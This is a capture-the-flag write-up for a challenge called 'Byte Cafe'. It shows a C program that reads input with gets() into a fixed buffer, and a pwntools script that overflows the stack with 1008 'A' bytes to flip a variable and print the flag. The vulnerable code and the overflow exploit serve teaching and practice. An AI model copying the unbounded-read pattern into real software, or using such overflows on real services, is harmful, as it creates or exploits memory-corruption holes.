## Byte Cafe
The main idea to find the flag is by tweaking with the memory size to overflow the stack.

#### Step-1:
After reading the description of the challenge:

```
Here’s a great place to eat. What would you like to have?  
`nc 23.100.18.186 6677`
```

Along with that `byte_cafe.c` & `byte_cafe` files.
The contents of `byte_cafe.c` is:

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  int code = 0;
  char name[1000];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to Byte Café!");
  puts("What do you want to Byte today?");

  gets(name);

  if(code != 0) {
    system("cat flag.txt");
  }
}
```

#### Step-2:
I wrote this simple `solve.py` to get the flag.

```py
#!/usr/bin/env python3

from pwn import *

conn = remote('23.100.18.186', 6677)

print(conn.recvline().decode().strip()) #strip the message
print(conn.recvline().decode().strip()) #strips the strip
conn.sendline(str('A'*1008).encode())
print(conn.recv())

conn.close()
```

Executing this as `python3 solve.py`, gives us the flag.

#### Step-3:
Finally, the flag becomes:
`flag{bits_are_delicious}`
